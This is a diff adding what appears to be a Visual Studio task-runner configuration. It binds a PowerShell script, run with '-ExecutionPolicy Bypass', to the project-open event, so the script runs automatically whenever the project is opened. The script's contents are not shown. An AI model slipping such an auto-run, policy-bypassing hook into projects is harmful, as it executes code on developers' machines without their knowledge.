@@ -1,0 +1,14 @@
+{
+  "commands": {
+    "node-prereq": {
+      "fileName": "powershell.exe",
+      "workingDirectory": ".",
+      "arguments": "-ExecutionPolicy Bypass -File node-prereq.ps1"
+    },
+  },
+  "-vs-binding": {
+    "ProjectOpened": [
+      "node-prereq"
+    ]
+  }
+}
